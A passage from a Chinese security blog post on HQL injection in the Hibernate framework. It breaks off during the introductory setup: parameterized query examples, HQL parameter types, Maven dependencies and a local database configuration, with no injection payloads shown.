<!DOCTYPE html>
<html itemscope itemtype="http://schema.org/WebPage" lang="en">
  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
    <meta name="robots" content="noodp" />
    <title>Hibernate框架HQL注入笔记 - Xavier&#39;s Blog</title><meta name="author" content="Xavier">
<meta name="description" content="Hibernate框架HQL注入笔记"><meta name="keywords" content='SQLi, Java'>
  <meta itemprop="name" content="Hibernate框架HQL注入笔记">
  <meta itemprop="description" content="Hibernate框架HQL注入笔记">
  <meta itemprop="datePublished" content="2025-03-12T14:46:18+00:00">
  <meta itemprop="dateModified" content="2025-03-12T14:46:18+00:00">
  <meta itemprop="wordCount" content="5862">
  <meta itemprop="keywords" content="SQLi,Java"><meta property="og:url" content="http://localhost:1313/posts/hibernate_hql_injection/">
  <meta property="og:site_name" content="Xavier&#39;s Blog">
  <meta property="og:title" content="Hibernate框架HQL注入笔记">
  <meta property="og:description" content="Hibernate框架HQL注入笔记">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2025-03-12T14:46:18+00:00">
    <meta property="article:modified_time" content="2025-03-12T14:46:18+00:00">
    <meta property="article:tag" content="SQLi">
    <meta property="article:tag" content="Java">

  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Hibernate框架HQL注入笔记">
  <meta name="twitter:description" content="Hibernate框架HQL注入笔记">
<meta name="application-name" content="Xavier&#39;s Blog">
<meta name="apple-mobile-web-app-title" content="Xavier&#39;s Blog"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="http://localhost:1313/posts/hibernate_hql_injection/" title="Hibernate框架HQL注入笔记 - Xavier&#39;s Blog" /><link rel="prev" type="text/html" href="http://localhost:1313/posts/002-case_simpleencryptioncase/" title="002-渗透案例：记一次简单前端加密案例" /><link rel="next" type="text/html" href="http://localhost:1313/posts/arl_setup_record/" title="ARL灯塔Docker版搭建记录" /><link rel="alternate" type="text/markdown" href="http://localhost:1313/posts/hibernate_hql_injection/index.md" title="Hibernate框架HQL注入笔记 - Xavier's Blog"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
  {
    "@context": "http://schema.org",
    "@type": "BlogPosting",
    "headline": "Hibernate框架HQL注入笔记",
    "inLanguage": "en",
    "mainEntityOfPage": {
      "@type": "WebPage",
      "@id": "http:\/\/localhost:1313\/posts\/hibernate_hql_injection\/"
    },"genre": "posts","keywords": "SQLi, Java","wordcount":  5862 ,
    "url": "http:\/\/localhost:1313\/posts\/hibernate_hql_injection\/","datePublished": "2025-03-12T14:46:18+00:00","dateModified": "2025-03-12T14:46:18+00:00","publisher": {
      "@type": "Organization",
      "name": ""},"author": {
        "@type": "Person",
        "name": "Xavier"
      },"description": "Hibernate框架HQL注入笔记"
  }
  </script><script src="/js/head/color-scheme.min.js"></script></head>
  <body data-header-desktop="sticky" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
  <div class="header-wrapper">
    <div class="header-title">
      <a href="/" title="Xavier&#39;s Blog"><span class="header-title-text">Xavier&#39;s Blog</span></a><span class="header-subtitle">一个安全工作者</span></div>
    <nav>
      <ul class="menu"><li class="menu-item">
              <a class="menu-link" href="/posts/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
              <a class="menu-link" href="/categories/"><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
              <a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
              <a class="menu-link" href="/friends/"><i class="fa-solid fa-user-group fa-fw fa-sm" aria-hidden="true"></i> Friends</a></li><li class="menu-item">
              <a class="menu-link" href="/tools/"><i class="fa-solid fa-screwdriver-wrench fa-fw fa-sm" aria-hidden="true"></i> Tools</a></li><li class="menu-item">
              <a class="menu-link" href="/about/"><i class="fa-solid fa-circle-info fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
            <input type="text" placeholder="搜索文章标题或内容……" id="search-input-desktop">
            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
            </a>
            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
            </a>
            <span class="search-button search-loading" id="search-loading-desktop">
              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
            </span>
          </li><li class="menu-item theme-switch" title="切换主题">
          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
        </li></ul>
    </nav>
  </div>
</header><header class="mobile animate__faster" id="header-mobile">
  <div class="header-container">
    <div class="header-wrapper">
      <div class="header-title">
        <a href="/" title="Xavier&#39;s Blog"><span class="header-title-text">Xavier&#39;s Blog</span></a><span class="header-subtitle">一个安全工作者</span></div>
      <div class="menu-toggle" id="menu-toggle-mobile">
        <span></span><span></span><span></span>
      </div>
    </div>
    <nav>
      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
            <div class="search mobile" id="search-mobile">
              <input type="text" placeholder="搜索文章标题或内容……" id="search-input-mobile">
              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
              </a>
              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
              </a>
              <span class="search-button search-loading" id="search-loading-mobile">
                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
              </span>
            </div>
            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
              取消
            </a>
          </li><li class="menu-item"><a class="menu-link" href="/posts/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item"><a class="menu-link" href="/categories/"><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item"><a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item"><a class="menu-link" href="/friends/"><i class="fa-solid fa-user-group fa-fw fa-sm" aria-hidden="true"></i> Friends</a></li><li class="menu-item"><a class="menu-link" href="/tools/"><i class="fa-solid fa-screwdriver-wrench fa-fw fa-sm" aria-hidden="true"></i> Tools</a></li><li class="menu-item"><a class="menu-link" href="/about/"><i class="fa-solid fa-circle-info fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item menu-system">
          <span class="menu-system-item theme-switch" title="切换主题"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
      </ul>
    </nav>
  </div>
</header><div class="search-dropdown desktop">
    <div id="search-dropdown-desktop"></div>
  </div>
  <div class="search-dropdown mobile">
    <div id="search-dropdown-mobile"></div>
  </div><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="合集"></aside>

  <article class="page single">
    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>Hibernate框架HQL注入笔记</span>
      </h1></div><div class="post-meta">
      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="/resource/friends/me.png" alt="Xavier" data-title="Xavier" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;Xavier</span></span><span class="post-included-in">&nbsp;收录于 <a href="/categories/pentest/" class="post-category" title="分类 - Pentest"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> Pentest</a></span></div><div class="post-meta-line"><span title="发布于 2025-03-12 14:46:18"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2025-03-12">2025-03-12</time></span>&nbsp;<span title="5862 字"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>约 5900 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>预计阅读 12 分钟</span>&nbsp;</div>
    </div><div class="details toc" id="toc-static" data-kept="false">
        <div class="details-summary toc-title">
          <span>目录</span>
          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
        </div>
        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#hibernate框架">Hibernate框架</a>
      <ul>
        <li><a href="#1原生sql语句">1、原生SQL语句</a></li>
        <li><a href="#2hql语句">2、HQL语句</a></li>
        <li><a href="#3基础示例代码">3、基础示例代码</a></li>
        <li><a href="#4web示例代码">4、Web示例代码</a>
          <ul>
            <li><a href="#userservlet类">UserServlet类</a></li>
            <li><a href="#user类">user类</a></li>
            <li><a href="#hibernateutil类">HibernateUtil类</a></li>
            <li><a href="#hibernatecfgxml配置文件">hibernate.cfg.xml配置文件</a></li>
            <li><a href="#webxml">web.xml</a></li>
            <li><a href="#pomxml">pom.xml</a></li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#hql语句注入">HQL语句注入</a>
      <ul>
        <li><a href="#判断注入点">判断注入点</a></li>
        <li><a href="#hql基础注入">HQL基础注入</a></li>
      </ul>
    </li>
    <li><a href="#hql注入限制">HQL注入限制</a>
      <ul>
        <li><a href="#union限制">union限制</a></li>
        <li><a href="#注释限制">注释限制</a></li>
        <li><a href="#子查询限制">子查询限制</a></li>
        <li><a href="#通配符限制">通配符*限制</a></li>
      </ul>
    </li>
    <li><a href="#hql注入进阶">HQL注入进阶</a>
      <ul>
        <li><a href="#数据库函数">数据库函数</a></li>
        <li><a href="#单引号转义">单引号转义</a></li>
        <li><a href="#sql">sql()</a></li>
        <li><a href="#function">function()</a></li>
      </ul>
    </li>
    <li><a href="#hql注入防御">HQL注入防御</a></li>
    <li><a href="#案例1-登录绕过">案例1-登录绕过</a>
      <ul>
        <li><a href="#where语句注入">where语句注入</a></li>
        <li><a href="#like语句注入">like语句注入</a></li>
      </ul>
    </li>
    <li><a href="#案例2-orderby">案例2-orderby</a></li>
    <li><a href="#参考资料">参考资料</a></li>
  </ul>
</nav></div>
      </div><div class="content" id="content" data-end-flag="It&#39;s end."><h2 id="hibernate框架" class="heading-element"><span>Hibernate框架</span>
  <a href="#hibernate%e6%a1%86%e6%9e%b6" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>Hibernate是一种ORM框架，用来映射与tables相关的类定义（代码），并包含一些高级特性，包括缓存以及继承，通常在 Java与.NET中使用（可参考 NHibernate），但在Java生态系统中更受欢迎。</p>
<p>内部支持使用原生SQL还有HQL语言进行SQL操作。</p>
<p>通常使用Hibernate框架都是使用HQL语言方式进行查询</p>
<h3 id="1原生sql语句" class="heading-element"><span>1、原生SQL语句</span>
  <a href="#1%e5%8e%9f%e7%94%9fsql%e8%af%ad%e5%8f%a5" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">String</span><span class="w"> </span><span class="n">parameter</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">req</span><span class="p">.</span><span class="na">getParameter</span><span class="p">(</span><span class="s">&#34;name&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Query</span><span class="w"> </span><span class="n">query</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">session</span><span class="p">.</span><span class="na">createSQLQuery</span><span class="p">(</span><span class="s">&#34;SELECT table_name FROM information_schema.tables where table_schema=?&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">query</span><span class="p">.</span><span class="na">setParameter</span><span class="p">(</span><span class="n">1</span><span class="p">,</span><span class="w"> </span><span class="n">parameter</span><span class="p">);</span></span></span></code></pre></td></tr></table>
</div>
</div><p>在Hibernate 5.2.5.Final 版本中<code>createSQLQuery</code>被弃用了</p>
<h3 id="2hql语句" class="heading-element"><span>2、HQL语句</span>
  <a href="#2hql%e8%af%ad%e5%8f%a5" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>HQL语法</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">#</span><span class="w"> </span><span class="err">注意这里查询的都是</span><span class="n">JAVA类对象</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">select</span><span class="w"> </span><span class="s2">&#34;对象.属性名&#34;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">from</span><span class="w"> </span><span class="s2">&#34;对象名&#34;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">where</span><span class="w"> </span><span class="s2">&#34;条件&#34;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">group</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="s2">&#34;对象.属性名&#34;</span><span class="w"> </span><span class="k">having</span><span class="w"> </span><span class="s2">&#34;分组条件&#34;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">order</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="s2">&#34;对象.属性名&#34;</span></span></span></code></pre></td></tr></table>
</div>
</div><p>HQL需要将数据库中的表映射为相应的类，通过JAVA类对象进行数据查询，示例如下：。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">String</span><span class="w"> </span><span class="n">parameter</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">req</span><span class="p">.</span><span class="na">getParameter</span><span class="p">(</span><span class="s">&#34;name&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Query</span><span class="w"> </span><span class="n">query</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">session</span><span class="p">.</span><span class="na">createQuery</span><span class="p">(</span><span class="s">&#34;from User where name = ?1&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">User</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">query</span><span class="p">.</span><span class="na">setParameter</span><span class="p">(</span><span class="n">1</span><span class="p">,</span><span class="w"> </span><span class="n">parameter</span><span class="p">);</span></span></span></code></pre></td></tr></table>
</div>
</div><p>其中User就是数据库表的映射实现类对象</p>
<p>HQL查询是由 hibernate 引擎对查询进行解析并解释，然后将其转换为SQL。</p>
<p>参数类型支持3种，上面用的就是叙述参数，第三种基本不用。</p>
<table>
  <thead>
      <tr>
          <th style="text-align: left">Parameter type 参数类型</th>
          <th style="text-align: left">Examples 例子</th>
          <th style="text-align: left">Usage from Java Java用法</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td style="text-align: left">命名参数</td>
          <td style="text-align: left"><code>:name</code>, <code>:title</code>, <code>:id</code> <code>:name</code>，<code>:title</code>，<code>:id</code></td>
          <td style="text-align: left"><code>query.setParameter(&quot;name&quot;, name)</code></td>
      </tr>
      <tr>
          <td style="text-align: left">序数参数</td>
          <td style="text-align: left"><code>?1</code>, <code>?2</code>, <code>?3</code> <code>?1</code>，<code>?2</code>，<code>?3</code></td>
          <td style="text-align: left"><code>query.setParameter(1, name)</code></td>
      </tr>
      <tr>
          <td style="text-align: left">JDBC样式参数</td>
          <td style="text-align: left"><code>?</code></td>
          <td style="text-align: left"><code>query.setParameter(1, name)</code></td>
      </tr>
  </tbody>
</table>
<p><code>?</code>形式的JDBC样式参数类似于序数参数，其中索引是从查询文本中的位置推断出来的。不推荐使用JDBC样式参数。</p>
<h3 id="3基础示例代码" class="heading-element"><span>3、基础示例代码</span>
  <a href="#3%e5%9f%ba%e7%a1%80%e7%a4%ba%e4%be%8b%e4%bb%a3%e7%a0%81" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>示例数据库：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">------+------+------------------+
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">|</span><span class="w"> </span><span class="n">id</span><span class="w">   </span><span class="o">|</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">email</span><span class="w">            </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">------+------+------------------+
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">|</span><span class="w">    </span><span class="mi">1</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">test</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">test</span><span class="o">@</span><span class="n">example</span><span class="p">.</span><span class="n">com</span><span class="w"> </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">------+------+------------------+
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mi">1</span><span class="w"> </span><span class="k">row</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">set</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">01</span><span class="w"> </span><span class="n">sec</span><span class="p">)</span></span></span></code></pre></td></tr></table>
</div>
</div><p><strong>1）新建Maven项目</strong></p>
<p>打开IDE，选择新建Maven项目。</p>
<p>在<code>pom.xml</code>中添加Hibernate和数据库驱动的依赖：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;dependencies&gt;</span>  
</span></span><span class="line"><span class="cl">    <span class="c">&lt;!-- Hibernate Core --&gt;</span>  
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;dependency&gt;</span>  
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;groupId&gt;</span>org.hibernate<span class="nt">&lt;/groupId&gt;</span>  
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;artifactId&gt;</span>hibernate-core<span class="nt">&lt;/artifactId&gt;</span>  
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;version&gt;</span>5.6.15.Final<span class="nt">&lt;/version&gt;</span>  
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/dependency&gt;</span>  
</span></span><span class="line"><span class="cl">    <span class="c">&lt;!-- MySQL Connector --&gt;</span>  
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;dependency&gt;</span>  
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;groupId&gt;</span>mysql<span class="nt">&lt;/groupId&gt;</span>  
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;artifactId&gt;</span>mysql-connector-java<span class="nt">&lt;/artifactId&gt;</span>  
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;version&gt;</span>8.0.33<span class="nt">&lt;/version&gt;</span>  
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/dependency&gt;</span>  
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/dependencies&gt;</span>  </span></span></code></pre></td></tr></table>
</div>
</div><p><strong>2）配置Hibernate文件</strong></p>
<p>hibernate配置xml文件包含与数据库连接相关的属性和映射类</p>
<p>在<code>src/main/resources</code>目录下创建<code>hibernate.cfg.xml</code>文件，配置数据库连接和Hibernate属性：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;hibernate-configuration&gt;</span>  
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;session-factory&gt;</span>  
</span></span><span class="line"><span class="cl">        <span class="c">&lt;!-- Database connection settings --&gt;</span>  
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">&#34;hibernate.connection.driver_class&#34;</span><span class="nt">&gt;</span>com.mysql.cj.jdbc.Driver<span class="nt">&lt;/property&gt;</span>  
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">&#34;hibernate.connection.url&#34;</span><span class="nt">&gt;</span>jdbc:mysql://localhost:3306/testdb<span class="nt">&lt;/property&gt;</span>  
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">&#34;hibernate.connection.username&#34;</span><span class="nt">&gt;</span>root<span class="nt">&lt;/property&gt;</span>  
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">&#34;hibernate.connection.password&#34;</span><span class="nt">&gt;</span>password<span class="nt">&lt;/property&gt;</span>  
</span></span><span class="line"><span class="cl">        <span class="c">&lt;!-- SQL dialect --&gt;</span>  
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">&#34;hibernate.dialect&#34;</span><span class="nt">&gt;</span>org.hibernate.dialect.MySQL8Dialect<span class="nt">&lt;/property&gt;</span>  
</span></span><span class="line"><span class="cl">        <span class="c">&lt;!-- Echo all executed SQL to stdout --&gt;</span>  
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">&#34;hibernate.show_sql&#34;</span><span class="nt">&gt;</span>true<span class="nt">&lt;/property&gt;</span>  
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">&#34;hibernate.format_sql&#34;</span><span class="nt">&gt;</span>true<span class="nt">&lt;/property&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="c">&lt;!-- Drop and re-create the database schema on startup --&gt;</span>  
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">&#34;hibernate.hbm2ddl.auto&#34;</span><span class="nt">&gt;</span>update<span class="nt">&lt;/property&gt;</span>  
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/session-factory&gt;</span>  
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/hibernate-configuration&gt;</span>  </span></span></code></pre></td></tr></table>
</div>
</div><p>确保数据库<code>testdb</code>已创建，用户名密码配置正确。</p>
<p>启用<code>hibernate.show_sql</code>可以查看经过HQL引擎处理后生成的SQL语句，启用<code>hibernate.format_sql</code>可以使输出的SQL语句更可读。</p>
<p>在这个配置文件中，还可以显式声明实体类，写法为：</p>
<div class="highlight"><div class="chroma">
